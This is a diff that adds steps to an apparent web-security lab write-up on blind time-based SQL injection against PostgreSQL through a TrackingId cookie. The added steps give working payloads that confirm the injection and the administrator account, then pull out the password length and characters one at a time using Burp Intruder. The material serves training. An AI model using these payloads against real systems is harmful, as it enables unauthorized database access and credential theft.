@@ -19,3 +19,13 @@ Using this technique, we can retrieve data by testing one character at a time:
 1) Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie
 2) Modify the TrackingId cookie, changing it to: <br> `TrackingId=x'||pg_sleep(10)--`
 3) Submit the request and observe that the application takes 10 seconds to respond.
+
+# Main Lab
+
+1) Confirm time delat sql injection:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
+2) Confirm there is user called administrator:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+3) Confirm characters of password:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` <br> Condition should be true password has more character than 1
+4) Continue it using burp intruder
+5) Now to find content of password we will use this payload: <br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` <br> then we will change `(password,2,1)='$a$)` to find second character of password and so on.
+
+Perfect explanation on you tube: https://youtu.be/L2e6wrNj4BA
